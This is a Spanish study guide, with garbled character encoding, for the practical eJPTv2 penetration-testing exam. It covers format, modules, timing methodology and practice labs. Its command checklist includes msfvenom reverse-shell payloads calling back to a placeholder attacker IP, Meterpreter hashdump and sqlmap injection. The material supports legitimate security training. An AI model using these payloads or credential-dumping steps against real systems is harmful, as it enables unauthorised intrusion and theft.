> [!info] Ficha tÃ©cnica
> **Programa:** MÃ¡ster en Ciberseguridad â€” Evolve Academy
> **Bloque:** 15 â€” Examen eJPTv2
> **Contenido:** QuÃ© evalÃºa el examen, cÃ³mo estudiarlo, cÃ³mo practicar en laboratorios reales, metodologÃ­a de examen y errores frecuentes

---

## â‘  QuÃ© debes tener claro antes de empezar a estudiar

El eJPTv2 (eLearnSecurity/INE Junior Penetration Tester) es un examen **100% prÃ¡ctico**: no hay preguntas teÃ³ricas sueltas sobre definiciones. Se te da acceso a una red de laboratorio real con varias mÃ¡quinas Windows y Linux, y un cuestionario de preguntas cuya respuesta solo se puede obtener enumerando y explotando esas mÃ¡quinas (versiones de servicio, credenciales, hashes, contenido de archivos, flags).

> [!important] Diferencia clave con ISO 27001
> A diferencia del examen ISO 27001, aquÃ­ no sirve memorizar: hacen falta horas de prÃ¡ctica real con las manos en el teclado. El mÃ¡ster ya te ha dado la base tÃ©cnica en los Bloques 2 a 10 â€” este bloque se centra en cÃ³mo convertir esa base en la metodologÃ­a de examen concreta que necesitas para aprobar con margen de tiempo.

---

## â‘¡ Formato y estructura del examen

| CaracterÃ­stica | Detalle |
|----------------|---------|
| **DuraciÃ³n** | Varios dÃ­as de acceso al laboratorio (no se hace en una sola sesiÃ³n de horas) |
| **Formato de preguntas** | OpciÃ³n mÃºltiple o de respuesta corta (introducir un dato concreto: una versiÃ³n, un hash, el contenido de una flag, un nombre de usuario) |
| **Acceso** | VPN a una red de laboratorio aislada con varias mÃ¡quinas objetivo |
| **Nota de corte** | Normalmente entre el 70-75% de preguntas correctas |
| **Informe** | No se exige entregar un informe formal de auditorÃ­a â€” el examen se aprueba respondiendo correctamente al cuestionario |

---

## â‘¢ Desglose de contenidos por mÃ³dulo (y cÃ³mo repasarlos)

| MÃ³dulo | Bloque de apuntes | Detalle |
|--------|-------------------|---------|
| **1. Information Gathering (OSINT)** | Bloque 3 | Dorks, Shodan/Censys, enumeraciÃ³n pasiva |
| **2. Scanning** | Bloques 3 y 5 | Todos los tipos de escaneo, interpretaciÃ³n de puertos filtered/closed/open, scripts NSE |
| **3. Vulnerability Assessment** | Bloque 5 | Uso de escÃ¡neres automatizados (Nessus/OpenVAS) para priorizar antes de explotar manualmente |
| **4. Host & Network Penetration Testing** | Bloque 5 completo | Los walkthroughs de mÃ¡quinas Linux y Windows, con especial atenciÃ³n a los servicios mÃ¡s comunes (SMB, FTP, SSH, HTTP) y sus vectores tÃ­picos |
| **5. ExplotaciÃ³n con Metasploit** | Bloque 5 | Manejar con soltura msfconsole, bÃºsqueda de exploits, msfvenom para generar payloads, y el manejo de sesiones Meterpreter |
| **6. Post-Exploitation** | Bloques 6 y 7 | Escalada de privilegios Linux/Windows y pivoting: en el examen es habitual que una pregunta requiera moverte de una mÃ¡quina a otra dentro de la red del laboratorio || **7. Web Application Penetration Testing** | Bloque 4 | OWASP Top 10 con comandos: SQLi con SQLMap y fuzzing de rutas son los vectores que mÃ¡s se repiten en mÃ¡quinas web del examen |

---

## â‘£ Checklist de comandos que debes dominar de memoria

No debes tener que "pensar" la sintaxis de estos comandos durante el examen â€” practica hasta que salgan automÃ¡tica:

### Reconocimiento y escaneo

```bash
nmap -sn 10.10.10.0/24 # descubrimiento de hosts vivos
nmap -p- -sV -oN full_scan.txt <IP> # escaneo completo puertos+versiones
nmap --script vuln <IP> # scripts NSE de detecciÃ³n de vulns
nmap -sU --top-ports 20 <IP> # escaneo UDP bÃ¡sico
```

### EnumeraciÃ³n de servicios comunes

```bash
smbclient -L //<IP>/ -N # shares SMB sin credenciales
enum4linux -a <IP> # enumeraciÃ³n completa SMB/RPC
showmount -e <IP> # exports NFS
snmpwalk -v2c -c public <IP> # SNMP con community por defecto
ftp <IP> # comprobar acceso anÃ³nimo
```

### ExplotaciÃ³n con Metasploit

```bash
msfconsole
search <servicio o CVE>
use exploit/ruta/del/exploit
set RHOSTS <IP>
set LHOST <TU_IP>
run
```

### GeneraciÃ³n de payloads con msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> \
 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> \
 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php
```

### Post-explotaciÃ³n con Meterpreter

```bash
sysinfo
getuid
hashdump
run post/multi/recon/local_exploit_suggester
background # (o bg) deja la sesiÃ³n activa sin perderla
```

### Web

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "http://<IP>/pagina.php?id=1" --dbs
```

â†’

---

## â‘¤ MetodologÃ­a de examen: cÃ³mo organizar tu tiempo

1. **Primeros 20-30 minutos:** escaneo completo de **TODA** la red del laboratorio (todas las IPs asignadas, todos los puertos) con `nmap -p- -sV`, guardando la salida en un archivo por host (`-oN`). **No explotes todavÃ­a nada**

2. **Con los escaneos completos**, responde primero las preguntas de reconocimiento puro ("Â¿cuÃ¡ntos hosts activos hay?", "Â¿quÃ© versiÃ³n de servicio corre en el puerto X del host Y?") â€” se resuelven sin explotar nada y dan puntos rÃ¡pidos y seguros

3. **Prioriza las mÃ¡quinas con vulnerabilidades mÃ¡s evidentes** (versiones muy desactualizadas, servicios con exploits pÃºblicos conocidos) antes de las que requieren mÃ¡s trabajo manual

4. **Cada vez que obtengas credenciales o un hash** en una mÃ¡quina, pruÃ©balo inmediatamente en el resto de servicios y mÃ¡quinas del laboratorio antes de seguir buscando otra vÃ­a â€” la reutilizaciÃ³n de credenciales es uno de los patrones que mÃ¡s se repite en el examen

5. **Documenta sobre la marcha** (usuario, contraseÃ±a, hash, ruta de la flag, host) en un archivo de texto simple â€” no confÃ­es en la memoria, sobre todo si el examen dura varios dÃ­as con pausas entre sesiones

> [!important] PatrÃ³n de eficiencia
> El reconocimiento inicial completo es el patrÃ³n que mÃ¡s tiempo ahorra en el examen real. Muchas preguntas se resuelven solo con el escaneo, sin explotar nada.

---

## â‘¥ CÃ³mo practicar antes del examen

La teorÃ­a de este mÃ¡ster (Bloques 2 a 10) te da la base, pero el eJPT se aprueba con horas de prÃ¡ctica acumulada resolviendo mÃ¡quinas completas de principio a fin, sin ayuda, y cronometrÃ¡ndote.

### Plan de prÃ¡ctica recomendado

| Semana | Actividad |
|--------|-----------|
| **1-2** | Consolidar fundamentos con guÃ­a: resolver 8-10 mÃ¡quinas "Easy" de Hack The Box o TryHackMe usando write-ups como apoyo la primera vez, y repitiÃ©ndolas sin apoyo una segunda vez unos dÃ­as despuÃ©s. Repasar el Bloque 5 y reproducir tÃº mismo, comando a comando, los tres walkthroughs completos (thetoppers.htb, Bacine, Granny) sin mirar la soluciÃ³n |
| **3** | PrÃ¡ctica sin red de seguridad: resolver 5-6 mÃ¡quinas nuevas (Easy/Medium) completamente a ciegas, sin write-up, cronometrando cuÃ¡nto tardas en cada fase (enumeraciÃ³n, explotaciÃ³n, escalada). Si te atasca mÃ¡s de 45-60 minutos en una fase, consulta brevemente una pista (no la soluciÃ³n completa) y continÃºa |
| **4** | Simulacro en condiciones de examen: montar un laboratorio con 3-4 mÃ¡quinas variadas (alguna Windows, alguna Linux, alguna web) y resolverlas en una sesiÃ³n continua de varias horas, aplicando exactamente la metodologÃ­a de la secciÃ³n 15.5 |

---

## â‘¦ Recursos de prÃ¡ctica recomendados

| Recurso | Nota |
|---------|------|
| **TryHackMe** â€” ruta "Jr Penetration Tester" | ProgresiÃ³n guiada muy alineada con el temario del eJPT |
| **Hack The Box** â€” mÃ¡quinas Easy y alguna Medium | Especialmente las retiradas (con write-ups disponibles para verificar tu proceso) |
| **Laboratorios propios de INE** | Los mÃ¡s representativos del formato exacto del examen, porque son del mismo proveedor |
| **Laboratorios y walkthroughs ya trabajados en el mÃ¡ster** | Repetirlos sin mirar la soluciÃ³n es una de las formas mÃ¡s eficientes de repasar |

---

## â‘§ Errores frecuentes que hacen perder tiempo o puntos

| Error | Consecuencia |
|-------|-------------|
| No guardar los resultados de Nmap en un archivo (`-oN`) | Obliga a re-escanear si se pierde la sesiÃ³n de terminal o hay que consultar un dato mÃ¡s tarde |
| Saltar la enumeraciÃ³n completa de puertos (`-p-`) y quedarse solo con los 1000 mÃ¡s comunes | Se pierden servicios en puertos altos donde a menudo estÃ¡ la vulnerabilidad clave |
| No probar credenciales por defecto o reutilizadas entre distintos servicios de la misma mÃ¡quina | El eJPT premia mucho la reutilizaciÃ³n de credenciales encontradas |
| Lanzarse a explotar antes de leer bien la pregunta | Muchas preguntas del examen no requieren explotaciÃ³n completa, basta con un escaneo o una enumeraciÃ³n bien hecha |
| No documentar sobre la marcha | Tener que repetir pasos ya hechos porque no se recuerda una credencial o una ruta encontrada media hora antes |

---

## â‘¨ El dÃ­a (o los dÃ­as) del examen

1. **Antes de empezar**, confirma que tu conexiÃ³n VPN al laboratorio es estable â€” una desconexiÃ³n a mitad de una sesiÃ³n de post-explotaciÃ³n puede hacer perder progreso si no habÃ­as guardado credenciales o notas

2. **Lee el cuestionario completo** antes de tocar el teclado, para saber quÃ© informaciÃ³n necesitas ir recolectando durante el escaneo y la explotaciÃ³n â€” asÃ­ no tienes que volver atrÃ¡s a por un dato que ya tenÃ­as delante

3. **Si el examen se extiende varios dÃ­as**, no dejes todo para el Ãºltimo dÃ­a: reparte el trabajo, y aprovecha los primeros dÃ­as para el reconocimiento y la explotaciÃ³n inicial de todas las mÃ¡quinas, dejando post-explotaciÃ³n y preguntas mÃ¡s complejas para el final con margen de tiempo

4. **Si una mÃ¡quina concreta te bloquea mucho tiempo**, pasa a otra y responde primero las preguntas que sÃ­ puedas resolver â€” no hay motivo para perder puntos seguros por quedarte atascado en una sola mÃ¡quina

> [!tip] GestiÃ³n del tiempo
> El examen dura varios dÃ­as. La clave es maximizar el nÃºmero de preguntas respondidas correctamente, no resolver todas las mÃ¡quinas. Prioriza preguntas fÃ¡ciles sobre mÃ¡quinas difÃ­ciles.

â†’

â†’

â†’

â†’
â†’
